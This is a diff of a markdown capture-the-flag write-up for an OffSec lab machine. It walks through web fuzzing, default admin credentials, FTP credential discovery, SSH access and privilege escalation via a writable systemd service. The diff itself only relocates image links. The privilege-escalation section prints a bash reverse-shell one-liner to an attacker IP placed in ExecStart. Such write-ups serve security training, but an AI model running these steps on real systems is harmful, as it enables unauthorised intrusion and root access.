@@ -36,8 +36,8 @@ Nmap done: 1 IP address (1 host up) scanned in 15.00 seconds
 ## Web Enumeration — Digging Into the Site
 
 Visiting `http://<target-ip>` revealed a web service. At this point, I added the following entries to `/etc/hosts`:
-![](Spidersociety1.png)
-![](Spidersociety2.png)
+![](Images/Spidersociety1.png)
+![](Images/Spidersociety2.png)
 Both [http://offsec.lab](http://offsec.lab/) and [http://spidersociety.offsec.lab](http://spidersociety.offsec.lab/) pointed to the same interface, which hinted at possible virtual hosts.
 
 ## 🏷️ VHost Fuzzing — Looking for Subdomains
@@ -51,14 +51,14 @@ No luck there. Nothing juicy turned up, so I pivoted to directory fuzzing.
 ## 📂 Directory Discovery — Jackpot Admin Panel
 
 Tried several wordlists, but this one gave me something interesting:
-![](Spidersociety3.png)
+![](Images/Spidersociety3.png)
 We don’t get a lot of useful information from this wordlist. But if we try another bigger wordlist, it seems like we get another hit.
-![](Spidersociety21.png)
+![](Images/Spidersociety21.png)
 Boom — found an admin login page. First thing I tried: `admin:admin`
-![](Spidersociety4.png)
+![](Images/Spidersociety4.png)
 Classic. And it worked! From the dashboard, I clicked into the `Communications`section to dig further.
-![](Spidersociety5.png)
-![](Spidersociety6.png)
+![](Images/Spidersociety5.png)
+![](Images/Spidersociety6.png)
 ## 🔐 Service Hunting — SSH & FTP
 
 Tried `ssh`next, but the creds didn’t work there. Switched to `ftp`— and it let me in.
@@ -68,45 +68,45 @@ ftp ss_ftpbckuser@offsec.lab -P 2121
 Inside the `libspider`directory, I found a strange hidden file with a long, random-looking name:
 
 
-![](Spidersociety7.png)
+![](Images/Spidersociety7.png)
 It definitely looked suspicious, but I couldn’t read it with `less` or download it using `get`. I then tried accessing it with `curl`—and finally got a meaningful response.
 **Method 1**
-![](Spidersociety11.png)
+![](Images/Spidersociety11.png)
 
 **Method 2**
 In one of the files, it lists a path to the credentials file.
-![](Spidersociety8.png)
-![](Spidersociety9.png)
+![](Images/Spidersociety8.png)
+![](Images/Spidersociety9.png)
 If we navigate to http://192.168.165.214/libspider/.fuhfjkzbdsfuybefzmdbbzdcbhjzdbcukbdvbsdvuibdvnbdvenv, we come across another set of credentials.
-![](Spidersociety10.png)
+![](Images/Spidersociety10.png)
 
 ## 🧑‍💻 SSH Login — We’re In
 
 Logged into the box via `ssh`using the above creds.
-![](Spidersociety12.png)
+![](Images/Spidersociety12.png)
 Captured local flag.
-![](Spidersociety13.png)
+![](Images/Spidersociety13.png)
 
 ### Privilege Escalation
 Once inside, I checked for `sudo`privileges:
-![](Spidersociety14.png)
+![](Images/Spidersociety14.png)
 We see that we have sudo permissions to restart a spiderbackup.service file. We can do a quick search to see if such a file exists.
-![](Spidersociety15.png)
+![](Images/Spidersociety15.png)
 
 Now, we verify if we have sufficient permissions over the file. If we can replace it with a malicious file, we might be able to use this to escalate privileges.
-![](Spidersociety16.png)
+![](Images/Spidersociety16.png)
 
-![](Spidersociety17.png)
+![](Images/Spidersociety17.png)
 I edited it to spawn a reverse shell.
 Since we can directly write into the file, we can use nano to edit the ExecStart field, replacing it with a one-liner to grant us a reverse shell.
 ```sh
 /bin/bash -c '/bin/sh -i >& /dev/tcp/192.168.45.240/4444 0>&1'
 ```
-![](Spidersociety18.png)
+![](Images/Spidersociety18.png)
 
 Before restarting the spiderbackup.service file, we are notified that we have to run “systemctl daemon-reload”.
-![](Spidersociety19.png)
-![](Spidersociety20.png)
+![](Images/Spidersociety19.png)
+![](Images/Spidersociety20.png)
 
 ### What `systemctl daemon-reload` Does
 
